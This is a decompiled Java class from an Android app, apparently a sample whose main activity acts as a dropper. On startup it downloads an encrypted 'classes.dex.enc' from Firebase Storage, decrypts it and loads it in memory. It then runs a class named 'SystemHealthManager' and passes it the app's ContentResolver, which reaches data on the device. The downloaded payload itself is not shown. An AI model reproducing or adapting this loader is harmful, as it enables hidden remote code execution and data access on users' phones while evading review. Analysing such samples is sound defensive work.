package com.siahaan.bagpack.activities;

import android.content.ContentResolver;
import com.siahaan.bagpack.utils.CryptoManager;
import com.siahaan.bagpack.utils.FirebaseStorageManager;
import dalvik.system.InMemoryDexClassLoader;
import java.io.File;
import java.nio.ByteBuffer;
import kotlin.Metadata;
import kotlin.ResultKt;
import kotlin.Unit;
import kotlin.coroutines.Continuation;
import kotlin.coroutines.intrinsics.IntrinsicsKt;
import kotlin.coroutines.jvm.internal.DebugMetadata;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.io.FilesKt;
import kotlin.jvm.functions.Function2;
import kotlin.jvm.internal.Intrinsics;
import kotlinx.coroutines.CoroutineScope;

/* compiled from: MainActivity.kt */
@Metadata(d1 = {"\u0000\f\n\u0000\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\u0010\u0000\u001a\n \u0002*\u0004\u0018\u00010\u00010\u0001*\u00020\u0003H\u008a@"}, d2 = {"<anonymous>", "", "kotlin.jvm.PlatformType", "Lkotlinx/coroutines/CoroutineScope;"}, k = 3, mv = {1, 6, 0}, xi = 48)
@DebugMetadata(c = "com.siahaan.bagpack.activities.MainActivity$onCreate$1", f = "MainActivity.kt", i = {0}, l = {39}, m = "invokeSuspend", n = {"$this$runBlocking"}, s = {"L$0"})
/* loaded from: classes.dex */
final class MainActivity$onCreate$1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Object>, Object> {
    final /* synthetic */ FirebaseStorageManager $firebaseStorageManager;
    private /* synthetic */ Object L$0;
    int label;
    final /* synthetic */ MainActivity this$0;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public MainActivity$onCreate$1(FirebaseStorageManager firebaseStorageManager, MainActivity mainActivity, Continuation<? super MainActivity$onCreate$1> continuation) {
        super(2, continuation);
        this.$firebaseStorageManager = firebaseStorageManager;
        this.this$0 = mainActivity;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
        MainActivity$onCreate$1 mainActivity$onCreate$1 = new MainActivity$onCreate$1(this.$firebaseStorageManager, this.this$0, continuation);
        mainActivity$onCreate$1.L$0 = obj;
        return mainActivity$onCreate$1;
    }

    @Override // kotlin.jvm.functions.Function2
    /* renamed from: invoke */
    public /* bridge */ /* synthetic */ Object mo2127invoke(CoroutineScope coroutineScope, Continuation<? super Object> continuation) {
        return invoke2(coroutineScope, (Continuation<Object>) continuation);
    }

    /* renamed from: invoke  reason: avoid collision after fix types in other method */
    public final Object invoke2(CoroutineScope coroutineScope, Continuation<Object> continuation) {
        return ((MainActivity$onCreate$1) create(coroutineScope, continuation)).invokeSuspend(Unit.INSTANCE);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) {
        CoroutineScope coroutineScope;
        Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
        int i = this.label;
        if (i == 0) {
            ResultKt.throwOnFailure(obj);
            CoroutineScope coroutineScope2 = (CoroutineScope) this.L$0;
            this.L$0 = coroutineScope2;
            this.label = 1;
            Object downloadEncryptedFile = this.$firebaseStorageManager.downloadEncryptedFile("classes.dex.enc", this);
            if (downloadEncryptedFile == coroutine_suspended) {
                return coroutine_suspended;
            }
            coroutineScope = coroutineScope2;
            obj = downloadEncryptedFile;
        } else if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        } else {
            coroutineScope = (CoroutineScope) this.L$0;
            ResultKt.throwOnFailure(obj);
        }
        File file = (File) obj;
        if (file != null) {
            ByteBuffer wrap = ByteBuffer.wrap(CryptoManager.INSTANCE.decrypt(FilesKt.readBytes(file)));
            Intrinsics.checkNotNullExpressionValue(wrap, "wrap(CryptoManager.decrypt(dexFile.readBytes()))");
            Class loadClass = new InMemoryDexClassLoader(wrap, coroutineScope.getClass().getClassLoader()).loadClass("com.siahaan.shm.SystemHealthManager");
            return loadClass.getMethod("run", ContentResolver.class).invoke(loadClass.newInstance(), this.this$0.getContentResolver());
        }
        System.out.println((Object) "Download failed.");
        return Unit.INSTANCE;
    }
}